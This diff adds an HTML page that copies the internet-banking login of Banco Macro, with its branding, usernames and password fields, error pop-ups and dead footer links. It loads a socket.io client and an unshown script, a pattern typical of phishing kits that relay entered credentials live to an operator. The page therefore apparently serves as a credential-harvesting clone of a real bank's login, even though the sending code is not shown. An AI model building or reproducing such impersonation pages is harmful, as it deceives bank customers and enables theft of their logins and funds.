@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Macro | Banca Internet Personas</title>
+    <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/css/index-desktop.css">
+</head>
+
+<body id="body">
+    <div class="estafas">
+        <div class="estafas-content">
+            <img src="/img/warningWhite.png" alt="warningWhite">
+            <p>ALERTA ESTAFAS: Si ves un mensaje de actualización de datos o instalación de algún programa o similares,
+                tu computadora esta infectada, no realices nada y comunicate con nosotros.</p>
+        </div>
+    </div>
+    <div>
+        <div class="section-content">
+            <div class="bienvenida">
+                <div>
+                    <img src="/img/logo_a.png" alt="Avatar">
+                </div>
+                <div>
+                    <h1 class="bienvenido-text">Bienvenido a Macro.</h1>
+                    <p class="lema">Cerca, siempre.</p>
+                </div>
+            </div>
+            <div id="login-box">
+                <div class="login-header">
+                    <img src="/img/back_icon_login.png" alt="Volver" id="volver">
+                    <img src="/img/icono-login_a.png" id="avatar" alt="icono-login_a.png">
+                    <h2 class="title-login">Ingresá a Banca Internet</h2>
+                </div>
+                <div class="user-info" id="user-content">
+                    <div class="label-user">
+                        <label id="label-input" for="usuario">Ingresá tu usuario</label>
+                    </div>
+                    <input placeholder="Usuario Banca Móvil/Internet" type="password" id="user" autocomplete="off" class="input" name="username">
+                    <img src="/img/icn-ver-clave_a.png" alt="ver-user" id="ver-user">
+                </div>
+                <div class="user-info pass" id="password-content">
+                    <div class="label-user pass">
+                        <label for="password">Clave</label>
+                    </div>
+                    <input type="password" id="pass" class="input" name="password">
+                </div>
+                <button id="btn-send">Ingresá</button>
+                <div class="teclado-virtual">
+                    <samp class="teclado">Teclado Virtual</samp>
+                </div>
+                <div class="nopodes">
+                    <a href="#" id="login-help" class="primera-vez">¿No podés ingresar o sos nuevo?</a>
+                </div>
+            </div>
+            <footer class="footer">
+                <div class="content">
+                    <ul>
+                        <li>
+                            <a style="display: inline-block; white-space: nowrap; width: 10%;" href="">Home</a>
+                            <a style="display: inline-block;  white-space: nowrap;  width: 15%;" href="">Contactanos</a>
+                            <a style="display: inline-block;  white-space: nowrap;  width: 18%;" href="">Teléfonos
+                                útiles</a>
+                            <a style="display: inline-block;  white-space: nowrap;  width: 20%;" href="">Preguntas
+                                frecuentes</a>
+                            <a style="display: inline-block;  white-space: nowrap;  width: 13%;" href="">Seguridad</a>
+                            <a style="display: inline-block;  white-space: nowrap; width: 20%;" href="">Terminos y
+                                condiciones</a>
+                        </li>
+                    </ul>
+                </div>
+            </footer>
+        </div>
+    </div>
+    <div id="preloader">
+
+    </div>
+    <div id="alert-modal">
+        <div class="content-banner">
+            <div style="min-width: 374px;">
+                <p id="text-alert">El nombre de usuario ingresado tiene un formato incorrecto, por favor ingréselo nuevamente</p>
+            </div>
+            <div class="cerrar-modal">
+                <button id="close-alert-modal">Aceptar</button>
+            </div>
+        </div>
+    </div>
+    <div id="alert-modal2">
+        <div class="content-banner">
+            <div style="min-width: 374px;">
+                <p id="text-alert2">Por favor ingresa tu contraseña</p>
+            </div>
+            <div class="cerrar-modal">
+                <button id="close-alert2-modal">Aceptar</button>
+            </div>
+        </div>
+    </div>
+    <div id="error-banner">
+        <div class="content-banner">
+            <div style="min-width: 374px;">
+                <p id="text-error">Acceso incorrecto al Sistema</p>
+            </div>
+            <div class="cerrar-modal">
+                <button id="close-error-banner">Aceptar</button>
+            </div>
+        </div>
+    </div>
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="/js/script.js"></script>
+</body>
+
+</html>
